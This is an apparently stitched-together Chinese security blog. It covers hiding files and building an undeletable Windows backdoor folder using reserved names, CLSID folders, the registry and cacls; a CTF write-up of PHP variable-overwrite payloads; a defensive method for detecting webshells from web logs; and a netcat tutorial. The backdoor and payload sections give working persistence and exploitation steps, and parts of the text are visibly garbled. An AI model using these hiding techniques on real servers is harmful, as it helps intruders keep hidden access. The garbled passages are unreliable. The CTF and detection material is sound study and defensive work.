<p>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt<br />
我们可以在cmd下这么做：</p>

<p>echo “” &gt;&gt; d:\test.asp</p>

<p>copy d:\test.asp .\d:\aux.asp<br />
这样就可以创建一个无法删除的文件了，这个文件在图形界面下是无法删除的，甚至del d:\aux.asp也无法删除</p>

<p>博主刚好遇到这样一道ctf</p>

<p>，发现一个文件COM6.KEY_shell.asp，这就是保留字文件，我们需要读取文件的内容，得到key ， 双击文件
，明明有这个文件，却提示找不到文件，经过我们一番百度：</p>

<p>type \.\C:\Inetpub\wwwroot\COM6.KEY_shell.asp</p>

<p><a href="https://zhidao.baidu.com/question/330540594.html">https://zhidao.baidu.com/question/330540594.html</a> 这个网址告诉了我们 \.\ 的用法</p>

<p>复制代码<br />
Q: 为什么rd /s /q \.\h:\autorun.inf\这条命令为什么能删除包含畸形文件夹在内的所有文件夹？</p>

<p>\.\理解为\127.0.0.1\就行了，当然实际上是行不通的。<br />
UNC的一个本地化特例。<br />
?\可以理解成遍历，?是统配符，表示匹配0个或1个任意字符。<br />
.\代表本地节点，在概念上来有点像磁盘根目录，也可以说成是计算机根目录。<br />
所以dir \.\C:\是可以被命令行解释器识别的，更可以跨盘符的来使用绝对路径引用，例如：</p>

<p>F:&gt;\.\C:\windows\system32\cmd.exe<br />
Microsoft Windows XP [版本 5.1.2600]<br />
© 版权所有 1985-2001 Microsoft Corp.<br />
F:&gt;<br />
使用UNC路径不会捡测路径中的保留字设备名称等，因此删除包含畸形文件夹在内的所有文件夹？。</p>

<p>Q: 为什么del /q /f /a \?%1可以删除所有文件？</p>

<p>A: UNC路径的一个特例。UNC路径就是符合 \servername\sharename 格式，其中 servername 是服务器名，sharename
是共享资源的名称。?是统配符，表示匹配0个或1个任意字符。使用UNC路径不会捡测路径中的保留字设备名称等，因此可以用这种方法来删除特殊文件或目录。</p>

<p>Q: 为什么说这样的命令非常危险？</p>

<p>A: 如果你想删除的文件夹中包含特殊路径，可能导致整个磁盘分区的数据全部被删除。因此，如果你还不能对这个命令了如指掌，不建议使用这样的命令。<br />
复制代码</p>

<p>2、利用clsid隐藏</p>

<p>windows中每一个程序都有一个clsid，创建一个文件夹，取名x.{21ec2020-3aea-1069-A2dd-08002b30309d}这时候打开这个文件夹就是控制面板了。</p>

<p>为了更隐蔽些我们可以结合windows保留字使用以下命令：</p>

<p>md .d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}</p>

<p>这样生成的文件夹无法删除，无法修改,无法查看</p>

<p>3、利用注册表隐藏</p>

<p>注册表路径：</p>

<p>HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionexplorer＼AdvancedFolderHiddenSHOWALL</p>

<p>在这个路径下有一个CheckedValue的键值，把他修改为0，如果没有CheckValue这个key直接创建一个，将他赋值为0，然后创建的隐藏文件就彻底隐藏了，即时在文件夹选项下把“显示所有文件”也不能显示了。</p>

<p>最后我们结合保留字和clsid两种方法生成一个后门。首先我们创建一个目录md
.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}<br />
接着attrib -s -h -a -r x:RECYCLED&amp;&amp;copyx:RECYCLED
.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}</p>

<p>为了保险起见，我们在这个回收站丢点东西证明它是在运作的echo
execcode&gt;&gt;.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}RECYCLEDaux.asp</p>

<p>好了一个超级猥琐的后门诞生了，但，并不完美，或许还可以这么做</p>

<p>attrib .d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}RECYCLEDaux.asp +h+s +r
+d /s /d</p>

<p>cacls /E /G Everyone:N</p>

<p>一个基于system桌面权限以及任何webshell，以及Cmd下的都无法查看，修改，和Del的完美后门诞生了。</p>

<p>4.利用畸形目录</p>

<p>不少人在XP系统下用md xxx…\命令建立带·的文件夹（亦称畸形目录），用来存放一些“秘密”的东东，需要看的时候，用运行命令打开。<br />
可是，在Win7系统下，这个方法失灵了。而且不能用XP系统下的方法打开这种文件夹。<br />
其实，md xxx…\方法是DOS时代就“发明”的方法，是利用微软文件系统的漏洞开个玩笑而已。<br />
很不幸的是，这种玩笑在XP时代被中国人奉为至宝，纷纷用来放一些见不得人的东东。其实知道打开方法的人都可以对这种文件夹下的“秘密”一览无遗。<br />
哎呀，话题扯远了，回到正题。在Win7系统下有无办法打开XP系统下建立的畸形目录呢？<br />
当然是有的！只要知道这种畸形目录的真实DOS（8.3格式）名称即可。怎样查看它的真实名称呢？<br />
很简单，用带/x参数的dir命令即可。<br />
假定在f盘的abc文件夹下有个畸形目录g…\（显示为g.文件夹），那么，在win7下打开命令行窗口，运行dir /x f:\abc命令，如下图。<br />
找到有g.的行，可以看到畸形文件夹的真实dos名称是GE2761，然后打开“运行”窗口，输入f:\abc\ge2761并回车，即可打开这个畸形目录。</p>

<p>刚做了一道ctf，利用的就是这个，我们来看：，有一个888.文件夹，我们点击打开</p>

<p>， 果然打不开，但是这个文件夹是真实存在的，我们利用上面上的方法<br />
7. 由一道ctf学习变量覆盖漏洞<br />
0×00 背景</p>

<p>近期在研究学习变量覆盖漏洞的问题，于是就把之前学习的和近期看到的CTF题目中有关变量覆盖的题目结合下进一步研究。</p>

<p>通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。</p>

<p>本篇收集了几个CTF中的题目作为例子，对$$，extract()，parse_str()的问题进行总结。</p>

<p>0×01 $$导致的变量覆盖问题</p>

<p>$$
导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test
会将$name的值覆盖，变为test。</p>

<p>复制代码</p>

<p>$value) { $$key = $value; } var_dump($key); var_dump($value); var_dump($$key);
echo $name; ?&gt;</p>

<p>复制代码</p>

<p>CTF中$$导致的变量覆盖问题的例题1：</p>

<p>题目源码：</p>

<p>复制代码</p>

<p>$value) { $$key = $$value; } foreach ($_POST as $key =&gt; $value) { $$key =
$value; } if ( $_POST[&ldquo;flag&rdquo;] !== $flag ) { die($_403); } echo “This is your
flag : “. $flag . “\n”; die($_200); ?&gt;</p>

<p>复制代码</p>

<p>题目分析：</p>

<p>源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了 . 两 个 f o r e a c
h 中 对 .两个foreach中对 .两个foreach中对key的处理是不一样的，满足条件后会将 f l a g 里 面 的 值 打 印 出 来 ， 所
以 flag里面的值打印出来，所以 flag里面的值打印出来，所以flag是在flag.php文件文件中的。</p>

<p>但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值赋给200或_403变量，然后利用die(200)或die(_403)将flag打印出来。</p>

<p>解题方法：</p>

<p>由于第7，11-14行间的代码会将 f l a g 的 值 给 覆 盖 掉 ， 所 以 只 能 利 用 第 一 个 f o r e a c h 先 将
flag的值给覆盖掉，所以只能利用第一个foreach先将 flag的值给覆盖掉，所以只能利用第一个foreach先将flag的值赋给 2 00 ， 然 后
利 用 d i e ( _200，然后利用die( 2​00，然后利用die(_200)将原本的flag值打印出来。</p>

<p>最终PAYLOAD：</p>

<p>本地复现，所以flag与原题不一样</p>

<p>GET DATA：?_200=flag</p>

<p>POST DATA：flag=aaaaaaaaaaaaaaaaaaaaa</p>

<p>01.png</p>

<p>0×02 extract()函数导致的变量覆盖问题</p>

<p>extract() 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>

<p>extract()的用法参考：<a href="http://www.runoob.com/php/func-array-extract.html">http://www.runoob.com/php/func-array-extract.html</a></p>

<p>语法： extract(array,extract_rules,prefix)</p>

<p>02.png</p>

<p>CTF中extract()导致的变量覆盖问题的例题1:</p>

<p>题目源码：</p>

<p>复制代码</p>

<p>复制代码</p>

<p>题目分析：</p>

<p>题目使用了extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if
的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>

<p>解题方法：</p>

<p>GET请求
?flag=&amp;gift=，extract()会将flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift==content。</p>

<p>最终PAYLOAD：</p>

<p>GET DATA： ?flag=&amp;gift=</p>

<p>CTF中extract()导致的变量覆盖问题的例题2:</p>

<p>题目源码：</p>

<p>复制代码</p>

<p>?&gt;<br />
复制代码</p>

<p>题目分析：</p>

<p>题目要求使用POST提交数据，extract( P O S T ) 会 将 P O S T 的 数 据 中 的 键 名 和 键 值 转 换 为 相 应 的
变 量 名 和 变 量 值 ， 利 用 这 个 覆 盖 _POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖
P​OST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖pass和$thepassword_123变量的值，从而满足pass==thepassword_123这个条件。</p>

<p>解题方法：</p>

<p>使用POST请求提交pass=&amp;thepassword_123=, 然后extract()会将接收到的数据将 p a s s 和 pass和
pass和thepassword_123变量的值覆盖为空，便满足条件了。</p>

<p>最终PAYLOAD：</p>

<p>POST DATA：pass=&amp;thepassword_123=</p>

<p>0×03 parse_str函数导致的变量覆盖问题</p>

<p>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>

<p>语法：parse_str(string,array)</p>

<p>003.png</p>

<p>parse_str() 用法参考：<a href="http://php.net/parse_str">http://php.net/parse_str</a></p>

<p>CTF中parse_str()导致的变量覆盖问题的例题1:</p>

<p>题目源码：</p>

<p>复制代码</p>

<p>复制代码</p>

<p>题目分析：</p>

<p>首先要求使用GET提交id参数，然后parse_str($id)对id参数的数据进行处理，再使用判断a[0] != ‘QNKCDZO’ &amp;&amp;
md5(a[0]) ==
md5(‘QNKCDZO’)的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足a[0]
!= ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10
x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a</p>

<p>PHP处理0e开头md5哈希字符串缺陷/bug 参考：<a href="http://www.cnblogs.com/Primzahl/p/6018158.html">http://www.cnblogs.com/Primzahl/p/6018158.html</a></p>

<p>解题方法：</p>

<p>使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0
所以相等，满足条件，得打flag。</p>

<p>最终PAYLOAD：</p>

<p>GET DATA:</p>

<p>?id=a[0]=s878926199a</p>

<p>or</p>

<p>?id=a[0]=240610708</p>

<p>0×04 小总结</p>

<p>变量覆盖漏洞在PHP代码审计中会以比较隐晦的方式存在，所以需要更加仔细的阅读源码找出漏洞的点，在CTF里面经常是以比较直接方式展示，所以可以先通过学习CTF各种变量覆盖的题目，然后掌握后再去审计cms，这样可以更加通透的理解掌握和挖掘变量覆盖漏洞。</p>

<p>—恢复内容结束—<br />
11. 几点基于Web日志的Webshell检测思路<br />
摘要:
Web日志记录了网站被访问的情况，在Web安全的应用中，Web日志常被用来进行攻击事件的回溯和取证。Webshell大多由网页脚本语言编写，常被入侵者用作对网站服务器操作的后门程序，网站被植入Webshell就说明网站已被入侵。Webshell检测手段常见的有运行后门查杀工具，比如D盾，或者部署防护软硬件对网站流量和本地文件进行检查，代价较大且对网站的访问性能有影响。因此，结合作者这几年做服务器入侵分析的一点经验，总结几点基于Web日志的轻量级的Webshell检测思路，通过对服务器日志文本文件进行分析，发现被植入的Webshell。
本文有点学术化，主要是提出几种简单易操作的思路。</p>

<p>1 Web日志与Webshell的关联<br />
Web日志是 Web 服务器（如IIS、Apache）记录用户访问行为产生的文件，标准的Web日志是纯文本格式，每行一条记录，对应客户端浏览器对服务器<br />
资源的一次访问典型的日志包括来源地址、访问日期、访问时间、访问URL等丰富的信息，对日志数据进行分析，不仅可以检测到可疑的漏洞攻击行为，还可以提取特定时间段特定
IP 对应用的访问行为。<br />
Web日志的格式虽略有不同，但记录的内容基本一致。这里以IIS服务器下W3C格式的日志为例，如图1。</p>

<p>图1 日志示例</p>

<p>本文实验数据来自一台曾被入侵的IIS服务器脱敏后的日志文件，日志时间范围为2013年6月-2014年6月，该服务器采用W3C日志格式，默认记</p>

<p>录字段如图2。</p>

<p>图2 日志文件实例</p>

<p>各字段说明如下。</p>

<p>date：发出请求时候的日期。</p>

<p>time：发出请求时候的时间。</p>

<p>s-sitename：服务名，记录当记录事件运行于客户端上的Internet服务的名称和实例的编号。</p>

<p>s-ip：服务器的IP地址。</p>

<p>cs-method：请求中使用的HTTP方法，GET/POST。</p>

<p>cs-uri-stem：URI资源，记录做为操作目标的统一资源标识符（URI），即访问的页面文件。</p>

<p>cs-uri-query：URI查询，记录客户尝试执行的查询，只有动态页面需要URI查询，如果有则记录，没有则以连接符-表示。即访问网址的附带参数。</p>

<p>s-port：为服务配置的服务器端口号。</p>

<p>cs-username：用户名，访问服务器的已经过验证用户的名称，匿名用户用连接符-表示。</p>

<p>c-ip：客户端IP地址。</p>

<p>cs(User-Agent)：用户代理，客户端浏览器、操作系统等情况。</p>

<p>sc-status：协议状态，记录HTTP状态代码，200表示成功，403表示没有权限，404表示找不到该页面，具体说明在下面。</p>

<p>sc-substatus：协议子状态，记录HTTP子状态代码。</p>

<p>sc-win32-status：Win32状态，记录Windows状态代码。</p>

<p>通过Web日志，我们可以知道在某一个时刻，某个访客访问了服务器的某个文件。经过分析，Webshell的访问特征通常包括特征文件名、特征参数</p>

<p>、访问频率、是否为孤立页面等。说明如表1所示。</p>

<p>上述特征皆可通过对Web日志条目进行特征匹配和访问频率统计得到。</p>

<p>2 检测思路的提出<br />
本文对基于Web日志的Webshell检测思路如下，在对日志文件进行预处理后，分别对日志记录进行文本特征匹配、统计特征计算与文件关联性分析，</p>

<p>最后对检测结果汇总，列出疑似的Webshell文件。</p>

<p>2.1日志预处理<br />
基于检测Webshell的目的，需要对原始的Web日志记录进行提取、分解、过滤、删除和合并，再转化成适合进行程序处理的格式。<br />
日志预处理的步骤如下，</p>

<ol>
<li><p>数据清理<br />
首先，由于Webshell通常为脚本页面，因此可删除静态的网站文件访问记录，如文件后缀为html、jpg、ico、css、js等，但需要注意，当网站存在文件包含漏洞或服务器解析漏洞的时候，需要注意异常文件名或URL，如“bg.asp:.jpg”和“/databackup/1.asp/imges/page_1.html”，此类文件名或URL也能具备Webshell功能，因此需对此种情况建立特征库进行排除。其次，删除日志记录的多余字段，包括空字段以及和Webshell访问无关的字段，比如s-
sitename、sc-substatus和sc-win32-status。最后，需要删除用户访问失败的记录，比如sc-
status字段值为404，表示该文件不存在，此条记录可以删除，尽可能多得排除冗余日志记录。</p></li>

<li><p>访客识别<br />
访客识别的目的是从每条日志记录里把访客和被访问页面关联起来，通常情况下可以通过cs-username、c-ip和cs(User-
Agent)标识一个访客，网站未设置登录功能时，可以采用IP和User-
Agent来标识一个访客。初步分析时，可以认为不同的IP地址代表不同的用户，其次，在NAT（NetworkAddressTranslation，网络地址转换）技术普遍应用的情况下，同一IP下可能存在多个用户，这个时候可以结合User-
Agent进行判断，User-Agent通常会因为操作系统版本和浏览器版本而有所变化。如果IP地址和User-
Agent都一样，也可以通过分析页面访问的规律来分析是否存在多个访客。在访客识别中，可以注意识别网络爬虫程序，如cs(User-
Agent)字段为“Baiduspider”，可以认为是百度爬虫，在Webshell的检测中，这里日志记录可以排除。</p></li>

<li><p>会话识别<br />
会话（session）识别的目的是为了分析访客在浏览站点期间的一系列活动，比如访客首先访问了什么页面，其次访问了什么页面，在某个页面提交了某个参数。通过分析多个用户的访问序列和页面停留时间，可以从日志中统计页面的访问频率和判断孤立页面。</p></li>
</ol>

<p>2.2文本特征匹配</p>

<p>通过本地搭建服务器环境，对大量Webshell页面进行访问测试和记录，建立Web日志的文本特征库，在所有文本信息中，主要提取Webshell在Web日志访问中的URI资源（对应字段cs-
uri-stem）特征和URI查询（对应字段cs-uri-query）特征。特征示例如表2。<br />
为了提高匹配覆盖率，通常将一类静态特征归纳成正则表达式的方式进行匹配，例如正则表达式“0-9]{1,5}.asp”表示匹配文件名为一到五位阿拉伯数字的后缀为asp的文件。除了基本的特征库的检测，为提高Webshell文件的覆盖面和对未知Webshell
的检测能力，可采用支持向量机(Support Vector
Machine，SVM）机器学习算法，通过对正常网站文件的访问特征集和Webshell文件访问特征集进行训练，来提高从Web日志中检测Webshell的能力。<br />
2.3基于统计特征的异常文件检测<br />
在统计特征中，主要考虑网页文件的访问频率，访问频率指的是一个网页文件在单位时间内的访问次数，通常正常的网站页面由于向访客提供服务因此受众较广，所以访问频率相对较高。而Webshell是由攻击者植入，通常只有攻击者清楚访问路径，因此访问频率相对较低。值得注意的是，网站开始运营时就会存在一定数量的正常页面，而Webshell通常在一段时间后才会出现，因此统计和计算页面访问频率的时候，针对某一页面，要采用该页面第一次被访问到最后一次被访问的时间段作为统计区间，然后计算单位时间内的访问次数，得到访问频率。需要说明的是，单凭访问频率特征，只能找出异常文件，无法确定一定是Webshell，一些正常页面的访问频率也会较低，比如后台管理页面或者网站建设初期技术人员留下的测试页面访问频率也较低。这里用f(A)
表示计算后的网站页面A的访问频率，Tfirst(A)表示网站页面A首次被访问的时间，Tend(A)
表示网站页面A最后一次被访问的时间，COUNTFE(A)表示网站页面A在时间Tfirst(A)到Tend(A)期间的被访问次数。因此，网站页面A的访问频率计算如下，</p>

<p>时间单位可根据需要选择小时、天、星期、月等。</p>

<p>2.4基于文件出入度的文件关联性检测<br />
文件关联性主要是指网页文件之间是否有交互，即是否通过超链接关联起来引导用户访问。而孤立文件通常是指没有与其他页面存在交互的页面，一个网页文件的入度衡量的是访客是否从其他页面跳转到该页面，同理，一个网页文件的出度衡量的是访客是否会从该页面跳转到其他页面。正常网站页面会互相链接，因此会有一定的出入度，而Webshell通常与其他网站页面没有超链接，通常出入度为0。需要注意的是，什么是孤立，与其他页面的交互度为多少算孤立，都是相对的。而且，有的Webshell也会有一定的出入度，比如当Webshell采用超链接列出网站目录中的文件的时候，就会产生与其他页面的交互。当需要多个脚本协同作用的Webshell
也会产生交互。同样，单凭文件出入度特征，只能找出异常文件，无法确定一定是Webshell，一些正常页面的出入度也会较低，比如特意隐藏的独立后台管理页面或者网站建设初期技术人员留下的独立测试页面出入度也较低。网页文件相互链接示意图如图3所示。</p>

<p>图3网页文件链接示意</p>

<p>如上例所示，本文对上述网页文件出入度的统计如下，</p>

<p>index.asp：出度为2，入度为1；</p>

<p>Article_Show.asp：出度为1，入度为1；</p>

<p>Photo_View.asp：出度为0，入度为1；</p>

<p>test.asp：出度为0，入度为0 ，判断为孤立文件。</p>

<p>3 检测方法可行性验证<br />
本文的重点在于提出一种从Web日志中检测Webshell的思路，找出可行的检测方法。本章节通过对实际的被入侵站点的日志记录进行分析，通过对比正常网页文件与Webshell在文本特征、统计特征和文件关联性特征，对第2章节提出的检测方法进行可行性验证。首先要考虑的是对照组的设置，也就是正常文件组和Webshell文件组的选取，本文实验数据来自一台曾被入侵的IIS服务器脱敏后的日志文件与Web目录文件。首先采用基于本地文件特征的Webshell查杀工具“D盾Webshell查杀工具”，对测试的Web目录文件进行检测，检测结果如图5所示。</p>

<p>图5 D盾查杀结果</p>

<pre><code>         在“D盾Webshell查杀工具”检测结果的基础上，结合人工判断，最终选取10个确定的Webshell文件作为Webshell文件组。然后对正常网页文件，根据对网站目录的分析，基于涵盖不同目录深度和页面功能的考虑下，人工选取10个文件作为正常文件组。正常文件组和Webshell文件组选取情况如表3所示。  
</code></pre>

<p>3.1文本特征对比<br />
分别统计正常文件组和Webshell文件组的URI资源（对应字段cs-uri-stem）特征和URI查询（对应字段cs-uri-
query）特征，看是否有较为明显的区别。</p>

<p>如表4所示。</p>

<p>由上图可以知道，Webshell文件和正常网页文件在日志中的访问特征有较为明显的区别，采用模式匹配和机器学习的方式进行分类检测思路可行，</p>

<p>且便于实施。</p>

<p>3.2统计特征计算和对比<br />
分别统计正常文件组和Webshell文件组的访问频率，看是否有较为明显的区别。如表5所示。</p>

<p>通过对实验数据进行分析，可得出如下结论。<br />
1) 在目录深度一致，和起始时间段较长的情况下（以大于30天为判断依据），正常网页文件的访问频率明显高于Webshell文件。<br />
2)
目录深度较高的正常网页文件，index.asp在三级目录下，访问频率也会较低，因此判断是否为Webshell文件时，要把访问频率和目录深度结合起来进行考虑。<br />
3)
单从Webshell文件的访问频率来看，有的数据特征呈现访问频率较高，仔细分析日志发现，该类Webshell往往是被攻击者当做一次性后门使用，起始阶段只有1天，而且访客单一，且有时攻击者会对自己上传的Webshell文件进行自动化的利用和扫描，导致较短时间内出现大量访问行为，呈现高频访问,特征，如bg.asp;.jpg。在这种情况下，仅凭借访问频率难以判断。经过分析和思考，为了准确判断此类Webshell，需要再结合文件的起始时间段和单位时间的独立访客数进行综合判断，当某个网页文件的呈现起始时间段较短，单位时间独立访客数较少的特征时，可首先判定为异常文件，再结合访问频率进行分析。这样便能有效解决误报问题。通过测试数据可以看出，在基于Web日志进行Webshell检测的过程中，单凭网页文件访问频率特征，误报率较高。需要结合网页文件目录深度、起始时间段和单位时间独立访客数等特征进行综合判断。而这3类特征，也可从Web日志中轻易得到。<br />
综上所述，基于访问频率计算与网页文件目录深度、起始时间段和单位时间独立访客数等特征相结合的Webshell检测方法可行。</p>

<p>3.3页面关联性分析对比<br />
分别统计正常文件组和Webshell文件组文件是否能从Web日志中发现多次出现的访问序列，访问序列反应当前页面与网站其他页面的关联性，若无，则判断为孤立文件。如表6所示。</p>

<pre><code>      实验数据显示，正常网页文件通常存在互相关联，而Webshell文件通常不存在文件之前的关联，关联性区分明显。原因是正常网页文件处于网站架构设计会互相设置超链接，而Webshell文件往往是攻击者通过网站漏洞直接上传或者通过已存在的Webshell上传到站点目录下的。而通过对Web日志进行分析发现，Web日志中保留了曾经存在过但是之后被删除的Webshell的访问记录，使得通过Web日志检测Webshell文件更加全面，弥补了本地Webshell文件检测无法追溯历史攻击的不足。
     综上说述，通过从Web日志中分析页面关联性来检测异常文件或Webshell的方法可行。
</code></pre>

<p>4 结语<br />
本文首先阐述了Web日志和Webshell的关联，然后提出了几点基于Web日志检测Webshell后门程序的检测思路，从文本特征、统计特征和关联性特征三个维度对正常网页文件和Webshell文件进行区分和判断，在初期方法设计的基础上，通过对实际的被入侵服务器的Web日志进行实验和验证，发现并弥补了方法设计的疏漏，证明了上述几点基于Web日志的Webshell检测方法的可行性和有效性。</p>

<p>原文链接： <a href="https://my.oschina.net/bluefly/blog/626132">https://my.oschina.net/bluefly/blog/626132</a><br />
12. nc/netcat 用法举例<br />
nc命令用法举例<br />
什么是nc<br />
nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具</p>

<p>nc的作用<br />
（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br />
（2）端口的扫描，nc可以作为client发起TCP或UDP连接<br />
（3）机器之间传输文件<br />
（4）机器之间网络测速</p>

<p>nc的控制参数不少，常用的几个参数如下所列：</p>

<ol>
<li><p>-l<br />
用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。</p></li>

<li><p>-p<br />
暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）</p></li>

<li><p>-s<br />
指定发送数据的源IP地址，适用于多网卡机</p></li>

<li><p>-u<br />
指定nc使用UDP协议，默认为TCP</p></li>

<li><p>-v<br />
输出交互或出错信息，新手调试时尤为有用<br />
6）-w<br />
超时秒数，后面跟数字<br />
7）-z<br />
表示zero，表示扫描时不发送任何数据</p></li>
</ol>

<p>前期准备：</p>

<p>准备两台机器，用于测试nc命令的用法<br />
主机A：ip地址 10.0.1.161<br />
主机B：ip地址 10.0.1.162</p>

<p>两台机器先安装nc和nmap的包<br />
yum install nc -y<br />
yum install nmap -y<br />
如果提示如下-bash： nc： command not found 表示没安装nc的包</p>

<p>nc用法1，网络连通性测试和端口扫描<br />
nc可以作为server端启动一个先关闭A的防火墙，或者放行下面端口，然后测试B机器是否可以访问A机器启动的端口<br />
在A机器上启动一个端口监听，比如 9999端口（注意：下面的-l 是小写的L，不是数字1）<br />
默认情况下下面监听的是一个tcp的端口<br />
nc -l 9999</p>

<p>客户端测试，测试方法1<br />
在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口</p>

<p>客户端测试，测试方法2<br />
B机器上也可以使用nmap扫描A机器的此端口<br />
nmap 10.0.1.161 -p9999</p>

<p>客户端测试，测试方法3<br />
使用nc命令作为客户端工具进行端口探测<br />
nc -vz -w 2 10.0.1.161 9999<br />
（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）</p>

<p>上面命令也可以写成<br />
nc -vzw 2 10.0.1.161 9999</p>

<p>客户端测试，测试方法4（和方法3相似，但用处更大）<br />
nc可以可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固<br />
在A机器上监听2个端口，一个9999，一个9998，使用&amp;符号丢入后台</p>

<p>在客户端B机器上扫描连续的两个端口，如下</p>

<p>nc作为server端启动一个启动一个udp的端口监听<br />
nc -ul 9998</p>

<p>复制当前窗口输入 netstat -antup |grep 9998 可以看到是启动了udp的监听</p>

<p>客户端测试，测试方法1<br />
nc -vuz 10.0.1.161 9998<br />
由于udp的端口无法在客户端使用telnet去测试，我们可以使用nc命令去扫描（前面提到nc还可以用来扫描端口）<br />
（telnet是运行于tcp协议的）<br />
（u表示udp端口，v表示可视化输出，z表示扫描时不发送数据）</p>

<p>上面在B机器扫描此端口的时候，看到A机器下面出现一串XXXXX字符串</p>

<p>客户端测试，测试方法2<br />
nmap -sU 10.0.1.161 -p 9998 -Pn<br />
（它暂无法测试nc启动的udp端口，每次探测nc作为server端启动的udp端口时，会导致对方退出侦听，有这个bug，对于一些程序启动的udp端口在使用nc扫描时不会有此bug）<br />
下面，A机器启动一个udp的端口监听，端口为9998<br />
在复制的窗口上可以确认已经在监听了</p>

<p>B机器使用nmap命令去扫描此udp端口，在扫描过程中，导致A机器的nc退出监听。所以显示端口关闭了（我推测是扫描时发数据导致的）<br />
nmap -sU 10.0.1.161 -p 9998 -Pn<br />
-sU ：表示udp端口的扫描<br />
-Pn ：如果服务器禁PING或者放在防火墙下面的，不加-Pn 参数的它就会认为这个扫描的主机不存活就不会进行扫描了，如果不加-Pn就会像下面的结果一样，它也会进行提示你添加上-Pn参数尝试的</p>

<p>注意：如果A机器开启了防火墙，扫描结果可能会是下面状态。（不能确定对方是否有监听9998端口）</p>

<p>既然上面测试无法使用nmap扫描nc作为服务端启动的端口，我们可以使用nmap扫描其余的端口<br />
（额，有点跑题了，讲nmap的用法了，没关系，主要为了说明nmap是也可以用来扫描udp端口的，只是扫描nc启动的端口会导致对方退出端口监听）<br />
下面，A机器上rpcbind服务，监听在udp的111端口</p>

<p>在B机器上使用nmap扫描此端口，是正常的检测到处于open状态</p>

<p>客户端测试，测试方法3<br />
nc扫描大量udp端口<br />
扫描过程比较慢，可能是1秒扫描一个端口，下面表示扫描A机器的1到1000端口（暂未发现可以在一行命令中扫描分散的几个端口的方法）<br />
nc -vuz 10.0.1.161 1-1000</p>

<p>方法1，传输文件演示（先启动接收命令）<br />
使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了<br />
把A机器上的一个rpm文件发送到B机器上<br />
需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。</p>

<p>步骤1，先在B机器上启动一个接收文件的监听，格式如下<br />
意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）<br />
nc -l port &gt;file<br />
nc -l 9995 &gt;zabbix.rpm</p>

<p>步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去<br />
nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm</p>

<p>B机器接收完毕，它会自动退出监听，文件大小和A机器一样，md5值也一样</p>

<p>方法2，传输文件演示（先启动发送命令）<br />
步骤1，先在B机器上，启动发送文件命令<br />
下面命令表示通过本地的9992端口发送test.mv文件<br />
nc -l 9992</p>

<p>步骤2，A机器上连接B机器，取接收文件<br />
下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv<br />
nc 10.0.1.162 9992 &gt;test2.mv</p>

<p>方法3，传输目录演示（方法发送文件类似）</p>

<p>步骤1，B机器先启动监听，如下<br />
A机器给B机器发送多个文件<br />
传输目录需要结合其它的命令，比如tar<br />
经过我的测试管道后面最后必须是 - ，不能是其余自定义的文件名<br />
nc -l 9995 | tar xfvz -</p>

<p>步骤2，A机器打包文件并连接B机器的端口<br />
管道前面表示把当前目录的所有文件打包为 - ，然后使用nc发送给B机器<br />
tar cfz - * | nc 10.0.1.162 9995</p>

<p>B机器这边已经自动接收和解压</p>

<p>测试网速其实利用了传输文件的原理，就是把来自一台机器的/dev/zero 发送给另一台机器的/dev/null<br />
就是把一台机器的无限个0，传输给另一个机器的空设备上，然后新开一个窗口使用dstat命令监测网速<br />
在这之前需要保证机器先安装dstat工具<br />
yum install -y dstat</p>

<p>方法1，测试网速演示（先启动接收命令方式）<br />
